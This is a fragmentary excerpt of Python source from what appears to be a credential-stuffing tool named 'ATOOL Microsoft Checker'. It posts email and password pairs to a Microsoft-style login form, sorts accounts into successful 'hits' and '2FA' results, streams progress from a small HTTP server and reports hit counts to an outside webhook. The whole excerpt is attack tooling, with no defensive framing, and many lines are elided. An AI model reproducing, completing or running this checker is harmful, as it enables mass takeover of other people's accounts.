    ...
    def check(self, email, password):
        try:
            payload = {
                ...
                "passwd": password, "ps": "2", "NewUser": "1", "fspost": "0"
            }
            r = self.session.post(
...
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/api/stream"):
            ...
            self.end_headers()
            try:
                for _ in range(60):  # keep alive for 1 minute
            ...
            self.end_headers()
            self.wfile.write(b"ATOOL Microsoft Checker - Live Mode Active")
            ...
            if webhook:
                try:
                    requests.post(webhook, json={
                        "content": f"**Check Complete** Hits: {len(results['hits'])} | 2FA: {len(results['2fa'])}"
                    }, timeout=5)
                except:
                    pass
